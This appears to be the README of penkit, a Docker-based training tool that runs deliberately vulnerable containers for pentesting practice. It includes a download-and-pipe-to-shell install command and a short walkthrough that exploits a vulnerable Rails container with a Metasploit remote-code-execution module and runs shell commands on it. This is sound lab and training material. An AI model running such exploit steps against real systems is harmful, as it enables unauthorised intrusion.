# penkit

[![Gem Version](https://badge.fury.io/rb/penkit.svg)](https://badge.fury.io/rb/penkit)
[![build status](https://gitlab.com/penkit/penkit/badges/master/build.svg)](https://gitlab.com/penkit/penkit/commits/master)
[![coverage report](https://gitlab.com/penkit/penkit/badges/master/coverage.svg)](https://gitlab.com/penkit/penkit/commits/master)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](http://penkit.io/legal/LICENSE.txt)

Penkit is a software suite designed to hone your pentesting skills. Using the power and flexibility of docker, we are able to build controlled, isolated environments for reproducing virtually any software vulnerability out there. Penkit has two major components: our strictly maintained image catalog and our full featured CLI application.

## Getting started

Penkit has only a couple of requirements and three different install options.

### Prerequisites

- Linux or OSX (x86-64)
- Docker 1.13+
- Ruby and rubygems (optional)

### Installation

#### Option 1: Quick install

Try our easy install script. ([view source](https://get.penkit.io))

```bash
$ wget -qO- https://get.penkit.io | sh
```

#### Option 2: Ruby gem

You can install the penkit gem directly from [rubygems.org](https://rubygems.org/gems/penkit):

```bash
$ gem install penkit
$ penkit help
```

#### Option 3: Docker image

If you don't have ruby, then you can use the penkit Docker image:

```bash
$ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock penkit/cli help
```

#### Option 4: Bash wrapper

If docker commands are a hassle to you, just download our bash wrapper:

```bash
$ wget -O /usr/local/bin/penkit https://gitlab.com/penkit/penkit/raw/master/scripts/penkit
$ chmod +x /usr/local/bin/penkit
$ penkit  help
```

### Usage

Take penkit for a spin with this quick rails exploit:

#### 1. Start a vulnerable rails container
```bash
$ penkit start rails:3.2.9
```

#### 2. Run exploit against the container using metasploit
```bash
$ penkit metasploit -x " \
  use exploit/multi/http/rails_xml_yaml_code_exec; \
  set RHOST rails; \
  set RPORT 8080; \
  run"
```

#### 3. Run shell commands on the compromised rails container
```bash
whoami
pwd
ls
```

#### 4. Stop the remote shell and metasploit
```bash
^ctrl-C
exit
```

#### 5. Clean up our penkit containers
```bash
$ penkit rm
```

#### 6. Learn more with integrated help
```bash
$ penkit help
```

## Contributing

Penkit is open-source, and we welcome contributions!

- [Open an issue](https://gitlab.com/penkit/penkit/issues)
- [Create a fork](https://gitlab.com/penkit/penkit/forks/new)

### Development

Local development requires ruby and bundler:

```bash
$ git clone git@gitlab.com:your_user/penkit penkit
$ cd penkit
$ bundle install
$ bundle exec penkit help
```

### Testing

Most of the tests for the Penkit CLI are ran through rspec:

```bash
$ bundle exec rspec
```

## License

Penkit is released under the [MIT License](LICENSE).
